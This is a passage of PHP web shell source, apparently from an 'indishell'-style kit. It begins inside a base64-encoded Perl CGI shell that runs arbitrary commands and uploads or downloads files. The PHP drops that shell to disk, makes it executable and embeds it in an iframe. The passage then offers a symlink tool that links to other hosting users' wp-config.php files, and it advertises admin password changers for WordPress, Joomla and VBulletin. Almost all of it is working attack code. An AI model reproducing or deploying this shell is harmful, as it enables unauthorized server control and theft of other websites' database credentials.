B0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPg0KJFByb21wdCBkb3dubG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3JpcHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBpcw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCmlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCnsNCiMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KDQokT2xkRGlyID0gJEN1cnJlbnREaXI7DQokQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQomUHJpbnRQYWdlSGVhZGVyKCJjIik7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQpwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7DQp9DQplbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCnsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQokQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQppZighJFdpbk5UKQ0Kew0KJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCmFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsNCn0NCmlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCnsNCiR8PTE7DQokQ29tbWFuZCAuPSAiIHwiOw0Kb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQp3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQp7DQokXyA9fiBzLyhcbnxcclxuKSQvLzsNCnByaW50ICIkX1xuIjsNCn0NCiR8PTA7DQp9DQplbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCnsNCnByaW50IGAkQ29tbWFuZGA7DQp9DQppZighJFdpbk5UKQ0Kew0KYWxhcm0oMCk7DQp9DQpwcmludCAiPC94bXA+IjsNCn0NCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCmxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQp7DQojIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQokRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQokRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7DQokSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5EDQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQplbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQp7DQomUHJpbnRQYWdlSGVhZGVyKCJmIik7DQpwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRzIHRoZSBzcGVjaWZpZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUNCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXINCnsNCmxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCmlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCnsNCmlmKCRXaW5OVCkNCnsNCmJpbm1vZGUoU0VOREZJTEUpOw0KYmlubW9kZShTVERPVVQpOw0KfQ0KJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQooJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiBtIShbXi9eXFxdKikkITsNCnByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCnByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQpwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCmNsb3NlKFNFTkRGSUxFKTsNCn0NCmVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQp7DQomUHJpbnRQYWdlSGVhZGVyKCJmIik7DQpwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCg0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQojIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQppZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCighJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0Kew0KJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KfQ0KZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCnsNCmNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQokVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KfQ0KDQppZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0Kew0KJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCn0NCmVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQp7DQomUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiIjsNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KDQomUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gJGlueydjJ307DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KDQokQWN0aW9uID0gJGlueydhJ307DQokQWN0aW9uID0gImxvZ2luIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICRpbnsnZCd9Ow0KY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOw0KDQokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7DQoNCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQomUGVyZm9ybUxvZ2luOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCiZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQomVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCiZQZXJmb3JtTG9nb3V0Ow0KfQ==';

$telfile = fopen("i/in.root" ,"w");

fwrite ($telfile,base64_decode($telnet));
    chmod("i/in.root",0755);
   echo "<iframe src=i/in.root width=100% height=40% ></iframe> ";


}


?>


<table width=100%>
<td align=center><a href="<?php echo "?wjc" ; ?>"><font color=white size=2 face="comic sans ms"><b>--==[[</font><font color=red size=2 face="comic sans ms">CMS based symlink,VBulletin,wordpress and Joomla admin panel password changer</font><font color=white size=2 face="comic sans ms">]]==--</a></table>
<?php 
echo $head;
if(isset($_GET['wjc']))
{
?>
	<table width=100%><tr><td align=center><font color="red" size="3" face="comic sans ms">cms based 
	symlink</font></a></td><td width=25% align=center><font color=white size=3 face="comic sans ms">VBulletin-pass changer</font></a>
	

	</td><td align=center><font color=white size=3 face="comic sans ms">wordpress-pass changer</font></a>
	

	</td><td width="20%"align=center><font color=red size=3 face="comic sans ms">Joomla-pass changer</font></a> </td></tr><td align=left> <?php
//cms based symlink funcion


		
echo "<Form Method =Post ACTION =' '>";
echo "<font size=2 color=white face='comic sans ms'>website username <input type='text' name='uname'>&nbsp&nbsp&nbsp<br> ";

echo "<font color='white' size=2 face='comic sans ms'><Input type = 'Radio' Name ='config'  value='wordpress'><font color='white'>wordpress";
echo "<br><Input type = 'Radio' Name ='config' value= 'joomla'><font color='white' size=2 face='comic sans ms'>joomla<br>";
echo "<Input type = 'Radio' Name ='config' value= 'vBulletin'><font color='white'  size=2 face='comic sans ms'>vBulletin";
echo "<br><Input type = 'Radio' Name ='config' value= 'any'><font color='white' size=2 face='comic sans ms'>public_html";
echo "<p>"; 
echo "<Input type = 'Submit' Name = 'Submit1' Value = '>>'>";
echo "</FORM>";

if(isset($_POST['Submit1']))
{
	$r=$_POST["config"];
if($r=="wordpress")
{
	
	$y=trim($_POST["uname"]);
	 
	
 function curPageURL() {
 $pageURL = 'http';
 
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $URL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 
 $pageURL =$URL;
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
 
}

 $r= dirname(curPageURL());
  $x=$r."/indishell/root/home/".$y."/public_html/wp-config.php";
  
echo "<br \><a href=". $x."><font color=white size=2 face='comic sans ms'>link to wp-config.php</a>";


	}	
	elseif($r=="joomla")
	{ 
	$un=trim($_POST["uname"]);
	 function curPageURL() {
 $pageURL = 'http';
